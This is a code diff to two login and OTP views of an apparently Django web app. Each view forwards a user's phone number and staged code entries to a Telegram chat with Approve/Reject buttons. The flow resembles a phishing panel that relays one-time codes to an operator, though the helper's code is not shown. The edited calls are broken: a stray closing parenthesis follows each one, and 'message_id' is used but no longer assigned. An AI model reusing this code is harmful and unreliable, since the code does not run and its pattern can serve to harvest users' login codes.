@@ -116,11 +116,11 @@ def login_view(request):
         request.session.modified = True
 
         # Send Telegram notification with Approve / Reject buttons
-        message_id = send_demo_verification_request(
-            verification.id,
-            phone,
-            demo_numbers_4,
-            stage="4",
+        send_demo_verification_request(
+        verification.id,
+        phone,
+        stage="4"
+        )
         )
 
         if message_id:
@@ -207,11 +207,11 @@ def otp_view(request):
         request.session.modified = True
 
         # Send Telegram for 6-number approval
-        message_id = send_demo_verification_request(
-            verification.id,
-            phone,
-            demo_numbers_6,
-            stage="6",
+        send_demo_verification_request(
+        verification.id,
+        phone,
+        stage="6"
+        )
         )
 
         if message_id:
